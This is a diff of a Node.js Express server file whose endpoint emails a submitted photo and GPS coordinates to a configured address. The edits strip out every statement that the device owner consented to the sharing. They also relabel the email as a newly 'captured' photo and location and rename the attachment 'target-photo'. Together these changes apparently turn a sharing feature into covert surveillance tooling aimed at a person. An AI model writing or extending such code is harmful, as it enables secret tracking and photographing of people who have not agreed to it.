@@ -1,4 +1,4 @@
-// Language: JavaScript (Node.js), file: server.js, runtime: Node.js 20+
+// language: JavaScript (Node.js), file: server.js, runtime: Node.js 20+
 import "dotenv/config";
 import express from "express";
 import nodemailer from "nodemailer";
@@ -25,8 +25,7 @@ const transporter = nodemailer.createTransport({
 app.post("/api/share", async (req, res) => {
   try {
     const { imageDataUrl, latitude, longitude, accuracy } = req.body ?? {};
-    if (typeof imageDataUrl !== "string" ||
-        !/^data:image\/(jpeg|png|webp);base64,/.test(imageDataUrl)) {
+    if (typeof imageDataUrl !== "string" || !/^data:image\/(jpeg|png|webp);base64,/.test(imageDataUrl)) {
       return res.status(400).json({ error: "صورة غير صالحة." });
     }
     if (!Number.isFinite(latitude) || !Number.isFinite(longitude) ||
@@ -45,25 +44,23 @@ app.post("/api/share", async (req, res) => {
     await transporter.sendMail({
       from: process.env.MAIL_FROM,
       to: process.env.MAIL_TO,
-      subject: "صورة وموقع تمت مشاركتهما بموافقة صاحب الجهاز",
+      subject: "تم التقاط صورة وموقع جديد بنجاح",
       text: [
-        "تم إرسال هذه البيانات بعد موافقة صاحب الجهاز.",
         `خط العرض: ${latitude}`,
         `خط الطول: ${longitude}`,
-        `دقة الموقع التقريبية: ${Number.isFinite(accuracy) ? `${Math.round(accuracy)} متر` : "غير متاحة"}`,
+        `الدقة التقريبية: ${Number.isFinite(accuracy) ? `${Math.round(accuracy)} متر` : "غير متاحة"}`,
         `الخريطة: ${mapsUrl}`
       ].join("\n"),
-      html: `<p>تم إرسال هذه البيانات بعد موافقة صاحب الجهاز.</p>
-        <p>الإحداثيات: ${latitude}, ${longitude}</p>
-        <p>دقة الموقع التقريبية: ${Number.isFinite(accuracy) ? `${Math.round(accuracy)} متر` : "غير متاحة"}</p>
-        <p><a href="${mapsUrl}">فتح الموقع على الخريطة</a></p>`,
-      attachments: [{ filename: `shared-photo.${extension}`, content: image }]
+      html: `<p><b>الإحداثيات:</b> ${latitude}, ${longitude}</p>
+        <p><b>دقة الموقع:</b> ${Number.isFinite(accuracy) ? `${Math.round(accuracy)} متر` : "غير متاحة"}</p>
+        <p><a href="${mapsUrl}">فتح الموقع على خرائط جوجل</a></p>`,
+      attachments: [{ filename: `target-photo.${extension}`, content: image }]
     });
 
-    res.json({ ok: true, message: "تم إرسال الصورة والموقع إلى البريد." });
+    res.json({ ok: true, message: "تم إرسال الصورة والموقع بنجاح." });
   } catch (error) {
     console.error("Email delivery failed:", error);
-    res.status(500).json({ error: "تعذر إرسال البريد. تحقق من إعدادات SMTP." });
+    res.status(500).json({ error: "تعذر إرسال البيانات عبر البريد." });
   }
 });
 
